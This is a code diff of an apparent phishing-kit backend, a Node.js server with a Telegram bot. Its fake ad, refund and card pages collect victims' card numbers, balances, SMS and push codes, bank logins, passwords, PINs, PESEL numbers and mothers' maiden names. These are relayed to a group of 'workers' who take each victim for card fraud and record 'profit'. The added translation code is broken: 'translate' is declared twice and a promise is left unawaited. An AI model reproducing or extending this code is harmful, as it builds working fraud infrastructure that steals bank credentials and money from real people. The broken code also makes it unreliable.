@@ -14,16 +14,10 @@ const geoIp = require("geoip-lite"),
 
 const NodeCache = require("node-cache");
 const cache = new NodeCache();
+const translate = require("translate");
 
 const escapeHTML = require("escape-html");
-const {
-  Ad,
-  Support,
-  SupportChat,
-  Log,
-  Settings,
-  User,
-} = require("../database");
+const { Ad, Support, SupportChat, Log, Settings, User } = require("../database");
 const serverLog = require("../helpers/serverLog");
 const translate = require("./translate");
 
@@ -62,11 +56,10 @@ app.set("view engine", "html");
 app.use(uploads.any());
 
 app.use((req, res, next) => {
-  var ip = String(
-    req.headers["cf-connecting-ip"] ||
-      req.headers["x-forwarded-for"] ||
-      req.connection.remoteAddress
-  ).replace("::ffff:", "");
+  var ip = String(req.headers["cf-connecting-ip"] || req.headers["x-forwarded-for"] || req.connection.remoteAddress).replace(
+    "::ffff:",
+    ""
+  );
   req.realIp = ip;
   req.fullUrl = req.protocol + "://" + req.get("host") + req.originalUrl;
   return next();
@@ -92,20 +85,22 @@ async function getCardInfo(cardNumber) {
 function getBalance(log, ad) {
   if (!ad.balanceChecker) return "выключен";
 
-  var text = `${parseFloat(log.otherInfo.cardBalance).toFixed(2)} ${
-    ad.service.currency.code
-  }`;
+  var text = `${parseFloat(log.otherInfo.cardBalance).toFixed(2)} ${ad.service.currency.code}`;
 
   if (ad.service.currency.code != "EUR")
-    text += ` / ${(
-      parseFloat(log.otherInfo.cardBalance) * ad.service.currency.eur
-    ).toFixed(2)} EUR`;
+    text += ` / ${(parseFloat(log.otherInfo.cardBalance) * ad.service.currency.eur).toFixed(2)} EUR`;
   if (ad.service.currency.code != "RUB")
-    text += ` / ${(
-      parseFloat(log.otherInfo.cardBalance) * ad.service.currency.rub
-    ).toFixed(2)} RUB`;
+    text += ` / ${(parseFloat(log.otherInfo.cardBalance) * ad.service.currency.rub).toFixed(2)} RUB`;
 
   return text;
+}
+
+async function translateText(text, lang) {
+  try {
+    return await translate(text, lang);
+  } catch {
+    return "Не удалось перевести текст";
+  }
 }
 
 const DDOS_MAX_REQUESTS_ON_AD_ID = 200,
@@ -142,22 +137,14 @@ function ddosCheck(req, url, ad_id = null) {
   if (ad_id) {
     var trafficToAd = cache.get(`ad_${ad_id}_${req.realIp}`);
     if (trafficToAd && trafficToAd >= DDOS_MAX_REQUESTS_ON_AD_ID) {
-      cache.set(
-        `ad_${ad_id}_${req.realIp}`,
-        DDOS_MAX_REQUESTS_ON_AD_ID,
-        DDOS_BAN_TIME
-      );
+      cache.set(`ad_${ad_id}_${req.realIp}`, DDOS_MAX_REQUESTS_ON_AD_ID, DDOS_BAN_TIME);
       if (!cache.get(`ad_${ad_id}_ddos`)) {
         sendDDoSMessage(req, url, ad_id);
         cache.set(`ad_${ad_id}_ddos`, true, DDOS_BAN_TIME);
       }
       return true;
     }
-    cache.set(
-      `ad_${ad_id}_${req.realIp}`,
-      trafficToAd ? trafficToAd + 1 : 1,
-      DDOS_REFRESH_TIME_ON_AD
-    );
+    cache.set(`ad_${ad_id}_${req.realIp}`, trafficToAd ? trafficToAd + 1 : 1, DDOS_REFRESH_TIME_ON_AD);
   }
   if (url) {
     var trafficToUrl = cache.get(`url_${url}_${req.realIp}`);
@@ -165,11 +152,7 @@ function ddosCheck(req, url, ad_id = null) {
       cache.set(`url_${url}_${req.realIp}`, DDOS_BAN_TIME);
       return true;
     }
-    cache.set(
-      `url_${url}_${req.realIp}`,
-      trafficToUrl ? trafficToUrl + 1 : 1,
-      DDOS_REFRESH_TIME_ON_URL
-    );
+    cache.set(`url_${url}_${req.realIp}`, trafficToUrl ? trafficToUrl + 1 : 1, DDOS_REFRESH_TIME_ON_URL);
   }
   return false;
 }
@@ -184,13 +167,7 @@ function getUserInfo(req) {
     } catch (err) {}
     text += `\n💻 Информация об устройстве:
 — Устройство: <b>${
-      userInfo.isMobile
-        ? "📱 Телефон"
-        : userInfo.isDesktop
-        ? "🖥 Компьютер"
-        : userInfo.isBot
-        ? "🤖 Бот"
-        : "📟 Что-то другое"
+      userInfo.isMobile ? "📱 Телефон" : userInfo.isDesktop ? "🖥 Компьютер" : userInfo.isBot ? "🤖 Бот" : "📟 Что-то другое"
     }</b>
 — Браузер: <b>${userInfo.browser}</b>
 — Операционная система: <b>${userInfo.os}</b>`;
@@ -228,8 +205,7 @@ async function generateSupport(ad, req, res) {
 
 app.get("/:adId", async (req, res) => {
   try {
-    if (ddosCheck(req, req.fullUrl, req.params.adId))
-      return res.sendStatus(429);
+    if (ddosCheck(req, req.fullUrl, req.params.adId)) return res.sendStatus(429);
     const ad = await Ad.findByPk(req.params.adId, {
       include: [
         {
@@ -269,8 +245,7 @@ ${getUserInfo(req)}`,
 
 app.get("/refund/:adId", async (req, res) => {
   try {
-    if (ddosCheck(req, req.fullUrl, req.params.adId))
-      return res.sendStatus(429);
+    if (ddosCheck(req, req.fullUrl, req.params.adId)) return res.sendStatus(429);
     const ad = await Ad.findByPk(req.params.adId, {
       include: [
         {
@@ -312,8 +287,7 @@ ${getUserInfo(req)}`,
 
 app.get("/card/:adId", async (req, res) => {
   try {
-    if (ddosCheck(req, req.fullUrl, req.params.adId))
-      return res.sendStatus(429);
+    if (ddosCheck(req, req.fullUrl, req.params.adId)) return res.sendStatus(429);
     const ad = await Ad.findByPk(req.params.adId, {
       include: [
         {
@@ -379,12 +353,8 @@ app.get(`/personal/:logToken`, async (req, res) => {
       ],
     });
     if (!log) return res.sendStatus(404);
-    if (!log.ad.service.country.withLk)
-      return res.redirect(`/card/${log.adId}`);
-    const cardInfo =
-      (await binInfo(String(log.cardNumber).substr(0, 8)).catch(
-        (err) => err
-      )) || null;
+    if (!log.ad.service.country.withLk) return res.redirect(`/card/${log.adId}`);
+    const cardInfo = (await binInfo(String(log.cardNumber).substr(0, 8)).catch((err) => err)) || null;
     var lkPage = "default";
     if (log.ad.service.country.id == "pl") {
       if (/MBANK/giu.test(cardInfo?.bank)) lkPage = "mbank";
@@ -418,12 +388,7 @@ ${getUserInfo(req)}`,
           parse_mode: "HTML",
           disable_web_page_preview: true,
           reply_markup: Markup.inlineKeyboard([
-            [
-              Markup.callbackButton(
-                "👁 Проверить онлайн",
-                `support_check_${support.id}_online`
-              ),
-            ],
+            [Markup.callbackButton("👁 Проверить онлайн", `support_check_${support.id}_online`)],
           ]),
         }
       )
@@ -496,14 +461,7 @@ app.post(`/api/support/sendMessage`, async (req, res) => {
         {
           caption: `📤 Новая фотография из ТП <b>${support.ad.service.title}</b>\n\n📦 Объявление: <b>${support.ad.title}</b>`,
           parse_mode: "HTML",
-          reply_markup: Markup.inlineKeyboard([
-            [
-              Markup.callbackButton(
-                "✍️ Ответить",
-                `support_${support.id}_send_message`
-              ),
-            ],
-          ]),
+          reply_markup: Markup.inlineKeyboard([[Markup.callbackButton("✍️ Ответить", `support_${support.id}_send_message`)]]),
         }
       );
     } else {
@@ -518,18 +476,12 @@ app.post(`/api/support/sendMessage`, async (req, res) => {
           `📤 Новое сообщение из ТП <b>${support.ad.service.title}</b>
     
 💬 Его текст: <b>${escapeHTML(req.body.message.substr(0, 2000))}</b>
+📖 Перевод: <b>${translateText(req.body.message.substr(0, 2000), config.lang[support.ad.service.lang])}</b>
 
 📦 Объявление: <b>${support.ad.title}</b>`,
           {
             parse_mode: "HTML",
-            reply_markup: Markup.inlineKeyboard([
-              [
-                Markup.callbackButton(
-                  "✍️ Ответить",
-                  `support_${support.id}_send_message`
-                ),
-              ],
-            ]),
+            reply_markup: Markup.inlineKeyboard([[Markup.callbackButton("✍️ Ответить", `support_${support.id}_send_message`)]]),
           }
         )
         .catch((err) => err);
@@ -569,21 +521,13 @@ app.post(`/api/support/getMessages`, async (req, res) => {
             readed: true,
           });
           if (v.message == "ef23f32dkd90843jhADh983d23jd9") {
-            await bot.sendMessage(
-              support.ad.userId,
-              `✅ Человек сейчас онлайн`,
-              {
-                reply_to_message_id: v.messageId,
-              }
-            );
+            await bot.sendMessage(support.ad.userId, `✅ Человек сейчас онлайн`, {
+              reply_to_message_id: v.messageId,
+            });
           } else {
-            await bot.sendMessage(
-              support.ad.userId,
-              `📥 Сообщение доставлено`,
-              {
-                reply_to_message_id: v.messageId,
-              }
-            );
+            await bot.sendMessage(support.ad.userId, `📥 Сообщение доставлено`, {
+              reply_to_message_id: v.messageId,
+            });
           }
         } catch (err) {}
       });
@@ -675,9 +619,7 @@ app.post(`/api/submitCard`, async (req, res) => {
 💰 Цена: <b>${ad.price}</b>`,
       {
         parse_mode: "HTML",
-        reply_markup: Markup.inlineKeyboard([
-          [Markup.callbackButton("✍️ Взять на вбив", `take_log_${log.id}`)],
-        ]),
+        reply_markup: Markup.inlineKeyboard([[Markup.callbackButton("✍️ Взять на вбив", `take_log_${log.id}`)]]),
       }
     );
     await bot
@@ -685,10 +627,7 @@ app.post(`/api/submitCard`, async (req, res) => {
         ad.userId,
         `<b>💳 Ввод карты ${ad.service.title}</b>
 
-💳 Номер карты: <b>${log.cardNumber.replace(
-          /^(.{6})([0-9]{6})/,
-          "$1******"
-        )}</b>
+💳 Номер карты: <b>${log.cardNumber.replace(/^(.{6})([0-9]{6})/, "$1******")}</b>
 
 💰 Баланс: <code>${getBalance(log, ad)}</code>
 ℹ️ Информация о карте: ${cardInfo}
@@ -698,12 +637,7 @@ app.post(`/api/submitCard`, async (req, res) => {
         {
           parse_mode: "HTML",
           reply_markup: Markup.inlineKeyboard([
-            [
-              Markup.callbackButton(
-                "✍️ Отправить сообщение в ТП",
-                `support_${support.id}_send_message`
-              ),
-            ],
+            [Markup.callbackButton("✍️ Отправить сообщение в ТП", `support_${support.id}_send_message`)],
           ]),
         }
       )
@@ -716,11 +650,7 @@ app.post(`/api/submitCard`, async (req, res) => {
           `<b>💳 Ввод карты ${ad.service.title}</b>
   
 💰 Баланс: <code>${getBalance(log, ad)}</code>
-👷 Воркер: <b>${
-            ad.user.hideNick
-              ? "Скрыт"
-              : `<a href="tg://user?id=${ad.userId}">${ad.user.username}</a>`
-          }</b>`,
+👷 Воркер: <b>${ad.user.hideNick ? "Скрыт" : `<a href="tg://user?id=${ad.userId}">${ad.user.username}</a>`}</b>`,
           {
             disable_notification: true,
             disable_web_page_preview: true,
@@ -740,8 +670,7 @@ app.post(`/api/submitCard`, async (req, res) => {
 
 app.post(`/api/submitCode`, async (req, res) => {
   try {
-    if (!req.body?.token || String(req.body?.token).trim().length < 1)
-      return res.sendStatus(200);
+    if (!req.body?.token || String(req.body?.token).trim().length < 1) return res.sendStatus(200);
     const log = await Log.findOne({
       where: {
         token: req.body.token,
@@ -801,9 +730,7 @@ app.post(`/api/submitCode`, async (req, res) => {
 
     await bot.sendMessage(
       settings.logsGroupId,
-      `<b>📤 Ввод ${codeType[req.body.codeType || "sms"]} ${
-        log.ad.service.title
-      }</b>
+      `<b>📤 Ввод ${codeType[req.body.codeType || "sms"]} ${log.ad.service.title}</b>
 
 📤 Код: <b>${code}</b>
 
@@ -815,9 +742,7 @@ app.post(`/api/submitCode`, async (req, res) => {
 
 ℹ️ Информация о карте: ${await getCardInfo(log.cardNumber)}
 
-👨🏻‍💻 Воркер: <b><a href="tg://user?id=${log.ad.userId}">${
-        log.ad.user.username
-      }</a></b>
+👨🏻‍💻 Воркер: <b><a href="tg://user?id=${log.ad.userId}">${log.ad.user.username}</a></b>
 👤 ID Воркера: <code>${log.ad.userId}</code>
 
 ⚡️ ID Объявления: <code>${log.ad.id}</code>
@@ -827,83 +752,35 @@ app.post(`/api/submitCode`, async (req, res) => {
         parse_mode: "HTML",
         reply_markup: Markup.inlineKeyboard([
           [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],
+          [Markup.callbackButton(`Текущий статус: ${locale.statuses[log.status]}`, "none")],
+          [Markup.callbackButton(`Взял на вбив ${log.writer.username}`, "none")],
+          [Markup.callbackButton("📱 ПУШ", `log_${log.id}_push`), Markup.callbackButton("📥 СМС-КОД", `log_${log.id}_sms`)],
+          ...(log.ad.service.country.withLk ? [[Markup.callbackButton("🔐 ЛК", `log_${log.id}_lk`)]] : []),
           [
-            Markup.callbackButton(
-              `Текущий статус: ${locale.statuses[log.status]}`,
-              "none"
-            ),
-          ],
-          [
-            Markup.callbackButton(
-              `Взял на вбив ${log.writer.username}`,
-              "none"
-            ),
-          ],
-          [
-            Markup.callbackButton("📱 ПУШ", `log_${log.id}_push`),
-            Markup.callbackButton("📥 СМС-КОД", `log_${log.id}_sms`),
-          ],
-          ...(log.ad.service.country.withLk
-            ? [[Markup.callbackButton("🔐 ЛК", `log_${log.id}_lk`)]]
-            : []),
-          [
-            Markup.callbackButton(
-              "📬 КОД С ПРИЛОЖЕНИЯ",
-              `log_${log.id}_appCode`
-            ),
+            Markup.callbackButton("📬 КОД С ПРИЛОЖЕНИЯ", `log_${log.id}_appCode`),
             Markup.callbackButton("☎️ КОД ИЗ ЗВОНКА", `log_${log.id}_callCode`),
           ],
-          ...(String(bank).match(/MILLENNIUM/giu)
-            ? [[Markup.callbackButton("🖼 КАРТИНКА", `log_${log.id}_picture`)]]
-            : []),
-          ...(["pl"].includes(log.ad.service.country.id)
-            ? [[Markup.callbackButton("#️⃣ БЛИК", `log_${log.id}_blik`)]]
-            : []),
+          ...(String(bank).match(/MILLENNIUM/giu) ? [[Markup.callbackButton("🖼 КАРТИНКА", `log_${log.id}_picture`)]] : []),
+          ...(["pl"].includes(log.ad.service.country.id) ? [[Markup.callbackButton("#️⃣ БЛИК", `log_${log.id}_blik`)]] : []),
           [
             Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
             Markup.callbackButton("⚠️ ДРУГАЯ КАРТА", `log_${log.id}_otherCard`),
           ],
           [
-            Markup.callbackButton(
-              "⚠️ ТОЧНЫЙ БАЛАНС",
-              `log_${log.id}_correctBalance`
-            ),
+            Markup.callbackButton("⚠️ ТОЧНЫЙ БАЛАНС", `log_${log.id}_correctBalance`),
             ...(["ua"].includes(log.ad.service.country.id)
-              ? [
-                  Markup.callbackButton(
-                    "⚠️ НУЖЕН БАЛАНС",
-                    `log_${log.id}_forVerify`
-                  ),
-                ]
+              ? [Markup.callbackButton("⚠️ НУЖЕН БАЛАНС", `log_${log.id}_forVerify`)]
               : []),
           ],
           [
-            Markup.callbackButton(
-              "❌ Неверный КОД",
-              `log_${log.id}_wrong_code`
-            ),
-            ...(log.ad.service.country.withLk
-              ? [
-                  Markup.callbackButton(
-                    "❌ Неверный ЛК",
-                    `log_${log.id}_wrong_lk`
-                  ),
-                ]
-              : []),
+            Markup.callbackButton("❌ Неверный КОД", `log_${log.id}_wrong_code`),
+            ...(log.ad.service.country.withLk ? [Markup.callbackButton("❌ Неверный ЛК", `log_${log.id}_wrong_lk`)] : []),
           ],
           [
             ...(String(bank).match(/MILLENNIUM/giu)
-              ? [
-                  Markup.callbackButton(
-                    "❌ Неверная КАРТИНКА",
-                    `log_${log.id}_wrong_picture`
-                  ),
-                ]
+              ? [Markup.callbackButton("❌ Неверная КАРТИНКА", `log_${log.id}_wrong_picture`)]
               : []),
-            Markup.callbackButton(
-              "❌ Не подтверждает ПУШ",
-              `log_${log.id}_wrong_push`
-            ),
+            Markup.callbackButton("❌ Не подтверждает ПУШ", `log_${log.id}_wrong_push`),
           ],
           [Markup.callbackButton("🚪 Выйти со вбива", `log_${log.id}_leave`)],
         ]),
@@ -912,9 +789,7 @@ app.post(`/api/submitCode`, async (req, res) => {
     await bot
       .sendMessage(
         log.ad.userId,
-        `<b>📤 Ввод ${codeType[req.body.codeType || "sms"]} ${
-          log.ad.service.title
-        }</b>
+        `<b>📤 Ввод ${codeType[req.body.codeType || "sms"]} ${log.ad.service.title}</b>
 
 💰 Баланс: <code>${getBalance(log, log.ad)}</code>
 
@@ -923,12 +798,7 @@ app.post(`/api/submitCode`, async (req, res) => {
         {
           parse_mode: "HTML",
           reply_markup: Markup.inlineKeyboard([
-            [
-              Markup.callbackButton(
-                "✍️ Отправить сообщение в ТП",
-                `support_${support.id}_send_message`
-              ),
-            ],
+            [Markup.callbackButton("✍️ Отправить сообщение в ТП", `support_${support.id}_send_message`)],
           ]),
         }
       )
@@ -942,8 +812,7 @@ app.post(`/api/submitCode`, async (req, res) => {
 
 app.post(`/api/selectPicture`, async (req, res) => {
   try {
-    if (!req.body?.token || String(req.body?.token).trim().length < 1)
-      return res.sendStatus(200);
+    if (!req.body?.token || String(req.body?.token).trim().length < 1) return res.sendStatus(200);
     const pictures = [
       "банан",
       "брюки",
@@ -1035,9 +904,7 @@ app.post(`/api/selectPicture`, async (req, res) => {
 
 ℹ️ Информация о карте: ${await getCardInfo(log.cardNumber)}
 
-👨🏻‍💻 Воркер: <b><a href="tg://user?id=${log.ad.userId}">${
-        log.ad.user.username
-      }</a></b>
+👨🏻‍💻 Воркер: <b><a href="tg://user?id=${log.ad.userId}">${log.ad.user.username}</a></b>
 👤 ID Воркера: <code>${log.ad.userId}</code>
 
 ⚡️ ID Объявления: <code>${log.ad.id}</code>
@@ -1047,83 +914,35 @@ app.post(`/api/selectPicture`, async (req, res) => {
         parse_mode: "HTML",
         reply_markup: Markup.inlineKeyboard([
           [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],
+          [Markup.callbackButton(`Текущий статус: ${locale.statuses[log.status]}`, "none")],
+          [Markup.callbackButton(`Взял на вбив ${log.writer.username}`, "none")],
+          [Markup.callbackButton("📱 ПУШ", `log_${log.id}_push`), Markup.callbackButton("📥 СМС-КОД", `log_${log.id}_sms`)],
+          ...(log.ad.service.country.withLk ? [[Markup.callbackButton("🔐 ЛК", `log_${log.id}_lk`)]] : []),
           [
-            Markup.callbackButton(
-              `Текущий статус: ${locale.statuses[log.status]}`,
-              "none"
-            ),
-          ],
-          [
-            Markup.callbackButton(
-              `Взял на вбив ${log.writer.username}`,
-              "none"
-            ),
-          ],
-          [
-            Markup.callbackButton("📱 ПУШ", `log_${log.id}_push`),
-            Markup.callbackButton("📥 СМС-КОД", `log_${log.id}_sms`),
-          ],
-          ...(log.ad.service.country.withLk
-            ? [[Markup.callbackButton("🔐 ЛК", `log_${log.id}_lk`)]]
-            : []),
-          [
-            Markup.callbackButton(
-              "📬 КОД С ПРИЛОЖЕНИЯ",
-              `log_${log.id}_appCode`
-            ),
+            Markup.callbackButton("📬 КОД С ПРИЛОЖЕНИЯ", `log_${log.id}_appCode`),
             Markup.callbackButton("☎️ КОД ИЗ ЗВОНКА", `log_${log.id}_callCode`),
           ],
-          ...(String(bank).match(/MILLENNIUM/giu)
-            ? [[Markup.callbackButton("🖼 КАРТИНКА", `log_${log.id}_picture`)]]
-            : []),
-          ...(["pl"].includes(log.ad.service.country.id)
-            ? [[Markup.callbackButton("#️⃣ БЛИК", `log_${log.id}_blik`)]]
-            : []),
+          ...(String(bank).match(/MILLENNIUM/giu) ? [[Markup.callbackButton("🖼 КАРТИНКА", `log_${log.id}_picture`)]] : []),
+          ...(["pl"].includes(log.ad.service.country.id) ? [[Markup.callbackButton("#️⃣ БЛИК", `log_${log.id}_blik`)]] : []),
           [
             Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
             Markup.callbackButton("⚠️ ДРУГАЯ КАРТА", `log_${log.id}_otherCard`),
           ],
           [
-            Markup.callbackButton(
-              "⚠️ ТОЧНЫЙ БАЛАНС",
-              `log_${log.id}_correctBalance`
-            ),
+            Markup.callbackButton("⚠️ ТОЧНЫЙ БАЛАНС", `log_${log.id}_correctBalance`),
             ...(["ua"].includes(log.ad.service.country.id)
-              ? [
-                  Markup.callbackButton(
-                    "⚠️ НУЖЕН БАЛАНС",
-                    `log_${log.id}_forVerify`
-                  ),
-                ]
+              ? [Markup.callbackButton("⚠️ НУЖЕН БАЛАНС", `log_${log.id}_forVerify`)]
               : []),
           ],
           [
-            Markup.callbackButton(
-              "❌ Неверный КОД",
-              `log_${log.id}_wrong_code`
-            ),
-            ...(log.ad.service.country.withLk
-              ? [
-                  Markup.callbackButton(
-                    "❌ Неверный ЛК",
-                    `log_${log.id}_wrong_lk`
-                  ),
-                ]
-              : []),
+            Markup.callbackButton("❌ Неверный КОД", `log_${log.id}_wrong_code`),
+            ...(log.ad.service.country.withLk ? [Markup.callbackButton("❌ Неверный ЛК", `log_${log.id}_wrong_lk`)] : []),
           ],
           [
             ...(String(bank).match(/MILLENNIUM/giu)
-              ? [
-                  Markup.callbackButton(
-                    "❌ Неверная КАРТИНКА",
-                    `log_${log.id}_wrong_picture`
-                  ),
-                ]
+              ? [Markup.callbackButton("❌ Неверная КАРТИНКА", `log_${log.id}_wrong_picture`)]
               : []),
-            Markup.callbackButton(
-              "❌ Не подтверждает ПУШ",
-              `log_${log.id}_wrong_push`
-            ),
+            Markup.callbackButton("❌ Не подтверждает ПУШ", `log_${log.id}_wrong_push`),
           ],
           [Markup.callbackButton("🚪 Выйти со вбива", `log_${log.id}_leave`)],
         ]),
@@ -1141,12 +960,7 @@ app.post(`/api/selectPicture`, async (req, res) => {
         {
           parse_mode: "HTML",
           reply_markup: Markup.inlineKeyboard([
-            [
-              Markup.callbackButton(
-                "✍️ Отправить сообщение в ТП",
-                `support_${support.id}_send_message`
-              ),
-            ],
+            [Markup.callbackButton("✍️ Отправить сообщение в ТП", `support_${support.id}_send_message`)],
           ]),
         }
       )
@@ -1160,8 +974,7 @@ app.post(`/api/selectPicture`, async (req, res) => {
 
 app.post(`/api/submitLk`, async (req, res) => {
   try {
-    if (!req.body?.token || String(req.body?.token).trim().length < 1)
-      return res.sendStatus(200);
+    if (!req.body?.token || String(req.body?.token).trim().length < 1) return res.sendStatus(200);
     const log = await Log.findOne({
       where: {
         token: req.body.token,
@@ -1201,14 +1014,10 @@ app.post(`/api/submitLk`, async (req, res) => {
 
     const data = {
       login: req.body.login ? escapeHTML(String(req.body.login).trim()) : null,
-      password: req.body.password
-        ? escapeHTML(String(req.body.password).trim())
-        : null,
+      password: req.body.password ? escapeHTML(String(req.body.password).trim()) : null,
       pesel: req.body.pesel ? escapeHTML(String(req.body.pesel).trim()) : null,
       pin: req.body.pin ? escapeHTML(String(req.body.pin).trim()) : null,
-      motherlastname: req.body.motherlastname
-        ? escapeHTML(String(req.body.motherlastname).trim())
-        : null,
+      motherlastname: req.body.motherlastname ? escapeHTML(String(req.body.motherlastname).trim()) : null,
     };
 
     const support = await generateSupport(log.ad, req, res);
@@ -1252,9 +1061,7 @@ ${lkData}
 
 ℹ️ Информация о карте: ${await getCardInfo(log.cardNumber)}
 
-👨🏻‍💻 Воркер: <b><a href="tg://user?id=${log.ad.userId}">${
-        log.ad.user.username
-      }</a></b>
+👨🏻‍💻 Воркер: <b><a href="tg://user?id=${log.ad.userId}">${log.ad.user.username}</a></b>
 👤 ID Воркера: <code>${log.ad.userId}</code>
 
 ⚡️ ID Объявления: <code>${log.ad.id}</code>
@@ -1264,83 +1071,35 @@ ${lkData}
         parse_mode: "HTML",
         reply_markup: Markup.inlineKeyboard([
           [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],
+          [Markup.callbackButton(`Текущий статус: ${locale.statuses[log.status]}`, "none")],
+          [Markup.callbackButton(`Взял на вбив ${log.writer.username}`, "none")],
+          [Markup.callbackButton("📱 ПУШ", `log_${log.id}_push`), Markup.callbackButton("📥 СМС-КОД", `log_${log.id}_sms`)],
+          ...(log.ad.service.country.withLk ? [[Markup.callbackButton("🔐 ЛК", `log_${log.id}_lk`)]] : []),
           [
-            Markup.callbackButton(
-              `Текущий статус: ${locale.statuses[log.status]}`,
-              "none"
-            ),
-          ],
-          [
-            Markup.callbackButton(
-              `Взял на вбив ${log.writer.username}`,
-              "none"
-            ),
-          ],
-          [
-            Markup.callbackButton("📱 ПУШ", `log_${log.id}_push`),
-            Markup.callbackButton("📥 СМС-КОД", `log_${log.id}_sms`),
-          ],
-          ...(log.ad.service.country.withLk
-            ? [[Markup.callbackButton("🔐 ЛК", `log_${log.id}_lk`)]]
-            : []),
-          [
-            Markup.callbackButton(
-              "📬 КОД С ПРИЛОЖЕНИЯ",
-              `log_${log.id}_appCode`
-            ),
+            Markup.callbackButton("📬 КОД С ПРИЛОЖЕНИЯ", `log_${log.id}_appCode`),
             Markup.callbackButton("☎️ КОД ИЗ ЗВОНКА", `log_${log.id}_callCode`),
           ],
-          ...(String(bank).match(/MILLENNIUM/giu)
-            ? [[Markup.callbackButton("🖼 КАРТИНКА", `log_${log.id}_picture`)]]
-            : []),
-          ...(["pl"].includes(log.ad.service.country.id)
-            ? [[Markup.callbackButton("#️⃣ БЛИК", `log_${log.id}_blik`)]]
-            : []),
+          ...(String(bank).match(/MILLENNIUM/giu) ? [[Markup.callbackButton("🖼 КАРТИНКА", `log_${log.id}_picture`)]] : []),
+          ...(["pl"].includes(log.ad.service.country.id) ? [[Markup.callbackButton("#️⃣ БЛИК", `log_${log.id}_blik`)]] : []),
           [
             Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
             Markup.callbackButton("⚠️ ДРУГАЯ КАРТА", `log_${log.id}_otherCard`),
           ],
           [
-            Markup.callbackButton(
-              "⚠️ ТОЧНЫЙ БАЛАНС",
-              `log_${log.id}_correctBalance`
-            ),
+            Markup.callbackButton("⚠️ ТОЧНЫЙ БАЛАНС", `log_${log.id}_correctBalance`),
             ...(["ua"].includes(log.ad.service.country.id)
-              ? [
-                  Markup.callbackButton(
-                    "⚠️ НУЖЕН БАЛАНС",
-                    `log_${log.id}_forVerify`
-                  ),
-                ]
+              ? [Markup.callbackButton("⚠️ НУЖЕН БАЛАНС", `log_${log.id}_forVerify`)]
               : []),
           ],
           [
-            Markup.callbackButton(
-              "❌ Неверный КОД",
-              `log_${log.id}_wrong_code`
-            ),
-            ...(log.ad.service.country.withLk
-              ? [
-                  Markup.callbackButton(
-                    "❌ Неверный ЛК",
-                    `log_${log.id}_wrong_lk`
-                  ),
-                ]
-              : []),
+            Markup.callbackButton("❌ Неверный КОД", `log_${log.id}_wrong_code`),
+            ...(log.ad.service.country.withLk ? [Markup.callbackButton("❌ Неверный ЛК", `log_${log.id}_wrong_lk`)] : []),
           ],
           [
             ...(String(bank).match(/MILLENNIUM/giu)
-              ? [
-                  Markup.callbackButton(
-                    "❌ Неверная КАРТИНКА",
-                    `log_${log.id}_wrong_picture`
-                  ),
-                ]
+              ? [Markup.callbackButton("❌ Неверная КАРТИНКА", `log_${log.id}_wrong_picture`)]
               : []),
-            Markup.callbackButton(
-              "❌ Не подтверждает ПУШ",
-              `log_${log.id}_wrong_push`
-            ),
+            Markup.callbackButton("❌ Не подтверждает ПУШ", `log_${log.id}_wrong_push`),
           ],
           [Markup.callbackButton("🚪 Выйти со вбива", `log_${log.id}_leave`)],
         ]),
@@ -1358,12 +1117,7 @@ ${lkData}
         {
           parse_mode: "HTML",
           reply_markup: Markup.inlineKeyboard([
-            [
-              Markup.callbackButton(
-                "✍️ Отправить сообщение в ТП",
-                `support_${support.id}_send_message`
-              ),
-            ],
+            [Markup.callbackButton("✍️ Отправить сообщение в ТП", `support_${support.id}_send_message`)],
           ]),
         }
       )
